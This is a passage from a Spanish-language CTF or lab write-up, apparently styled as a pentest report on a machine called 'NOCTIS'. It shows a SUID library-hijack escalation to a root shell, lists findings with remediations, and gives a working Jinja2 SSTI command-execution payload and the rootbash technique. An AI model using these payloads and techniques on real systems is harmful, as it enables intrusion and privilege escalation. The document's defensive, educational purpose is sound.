cat /tmp/root_flag
ls -la /tmp/rootbash
```

```text
[*] lib reemplazada
total 28
drwxr-xr-x 1 nova nova  4096 Nov 11 18:31 .
drwxr-xr-x 1 nova nova  4096 Oct 11 17:31 ..
-rwxrwxr-x 1 nova nova 15680 Nov 11 18:31 libnoctsec.so
[*] ejecutando voidaudit (SUID root)
[voidaudit] v2.4 · shim libnoctsec 1.4.2 · arranque audit-thread
[voidaudit] digest del journal:
[0xF7] voidjournal online
[0xF8] shim re-firmado (no recompilado) por nova (delegación de parcheo)
[0xF9] auditoría pendiente desde ciclo 2019 — sello RAIZ sigue en /root
[voidaudit] canal cerrado.
[*] resultado:
uid=1001(nova) gid=1001(nova) groups=1001(nova)
NOCTIS{d4rk_v01d_0wn3d_8c4f2e}
-rwsr-xr-x 1 root root 1446024 Nov 11 18:31 /tmp/rootbash
```

Confirmado control total (euid 0 y escritura en ´/root´):

```bash
nova@noctis:/$ /tmp/rootbash -p -c 'id; hostname'
```

```text
uid=1001(nova) gid=1001(nova) euid=0(root) groups=1001(nova)
noctis
```

```bash
nova@noctis:/$ /tmp/rootbash -p -c 'cat /root/root.txt'
```

```text
NOCTIS{d4rk_v01d_0wn3d_8c4f2e}
```

Obtengo la flag de **root**

---

## 4. Hallazgos

### H-01 — Server-Side Template Injection (SSTI) → RCE · CRÍTICO (CVSS ~9.8)
- **Ubicación:** `POST /admin/chat` (`render_template_string(str(msg))` en `/opt/web/admin.py`).
- **Evidencia:** payload `{{7*7}}` devuelve `49`; `{{ cycler.__init__.__globals__.os.popen('id').read() }}` devuelve `uid=33(www-data)`.
- **Impacto:** ejecución arbitraria de comandos en el servidor web.
- **Remediación:** no renderizar entrada de usuario; usar plantillas estáticas con contexto acotado o un motor sandboxeado. Validar/escapar y aplicar listas blancas.

### H-02 — Bypass de autenticación + JWT HS256 con clave débil · CRÍTICO (CVSS ~9.1)
- **Ubicación:** `POST /admin/auth`, `SECRET_KEY = "midnight"` en `/opt/web/admin.py`.
- **Evidencia:** cualquier credencial devuelve token válido; la clave se obtuvo del HTML público/esteganografía y se verificó criptográficamente.
- **Impacto:** elevación a `role=admin` sin credenciales legítimas; acceso total al panel.
- **Remediación:** validar credenciales reales, rotar y almacenar el secreto en un gestor (nunca en código), usar claves de alta entropía y preferiblemente RS256/EdDSA; invalidar tokens legacy.

### H-03 — Secretos y credenciales en Redis sin autenticación · ALTO (CVSS ~8.8)
- **Ubicación:** `127.0.0.1:6379`.
- **Evidencia:** `vault:creds:nova:main` = `n0v4-xr-7734`; también `vault:gate:pin:cur`, notas y flags señuelo.
- **Impacto:** robo de credenciales y pivote a la cuenta `nova` (SSH).
- **Remediación:** `requirepass`/ACL, bind a socket local, cifrado de secretos en reposo y rotación de credenciales. Nunca almacenar contraseñas en claro.

### H-04 — SUID con carga de librería desde ruta escribible (library hijacking) · ALTO (CVSS ~7.8)
- **Ubicación:** `/usr/bin/voidaudit` (SUID root) + `RUNPATH=/opt/noctis/lib` (propiedad de `nova`).
- **Evidencia:** reemplazo de `libnoctsec.so` por una .so con constructor → `voidaudit` ejecuta como root; shell SUID resultante con `euid=0`.
- **Impacto:** escalada local a root para cualquier usuario `nova`.
- **Remediación:** eliminar el bit SUID si no es imprescindible; ubicar la librería en un path root-only e inmutable; verificar integridad/firma antes de cargar; evitar RPATH/RUNPATH en directorios de usuario.

### H-05 — Fuga de información y secretos en artefactos públicos · MEDIO (CVSS ~5.3)
- **Ubicación:** comentario HTML de la landing y `/static/img/hero.jpg`.
- **Evidencia:** comentario revela `midnight`, bundle legacy y vhost; steghide extrae `hint.txt` con `admin.noctis` y stack JWT.
- **Impacto:** reduce drásticamente el esfuerzo de ataque (reconocimiento y obtención de clave).
- **Remediación:** eliminar comentarios y metadatos de build; no publicar artefactos con datos ocultos; revisar pipelines de assets.

### H-06 — Vhost/panel legacy expuesto y contraseñas reutilizadas · MEDIO
- **Ubicación:** `admin.noctis`, SSH.
- **Impacto:** superficie de ataque oculta pero accesible; reutilización de credenciales Redis→SSH.
- **Remediación:** retirar el tier legacy, segmentar el panel, aplicar MFA y no reutilizar credenciales entre servicios.

---

## 5. Evidencia clave

```
# SSTI
POST /admin/chat  {"msg":"{{7*7}}"}            -> {"reply":"49"}
POST /admin/chat  {"msg":"{{...os.popen('id').read()}}"} -> uid=33(www-data)

# JWT
clave HS256 verificada: "midnight"
token forjado role=admin -> GET /admin/panel = 200

# Redis
vault:creds:nova:main = n0v4-xr-7734
vault:gate:pin:cur    = noct-7714-void

# Escalada
voidaudit (SUID) carga /opt/noctis/lib/libnoctsec.so (nova-writable)
-> /tmp/rootbash -p -c 'id' = euid=0(root)
-> cat /root/root.txt = NOCTIS{d4rk_v01d_0wn3d_8c4f2e}
```

---

## 6. Recomendaciones priorizadas

1. **Inmediato:** eliminar la SSTI y rotar `SECRET_KEY`; invalidar todos los tokens emitidos.
2. **Inmediato:** sacar credenciales de Redis y del código; rotar `nova` y revisar accesos SSH.
3. **Corto plazo:** quitar SUID de `voidaudit` o aislar su librería en path root-only con verificación de integridad.
4. **Corto plazo:** deshabilitar/aislar el panel legacy y el vhost no publicado; exigir MFA.
5. **Medio plazo:** limpiar artefactos públicos (comentarios, metadatos, esteganografía) y establecer revisión de build.
6. **Continuo:** autenticación por clave en SSH, gestión centralizada de secretos, mínimo privilegio y auditorías periódicas (la última registrada data de 2019).

---

## 7. Conclusión

El entorno NOCTIS es **completamente comprometible** por un atacante externo sin credenciales, en una cadena de cuatro eslabones (fuga de información → bypass de auth/JWT → RCE → escalada SUID). La causa raíz es la deuda técnica del "tier legacy": secretos hardcodeados, plantillas inseguras, servicios internos sin autenticación y permisos SUID mal configurados. Se recomienda tratar los hallazgos H-01 a H-04 como incidentes críticos y ejecutar la rotación de credenciales de forma inmediata.
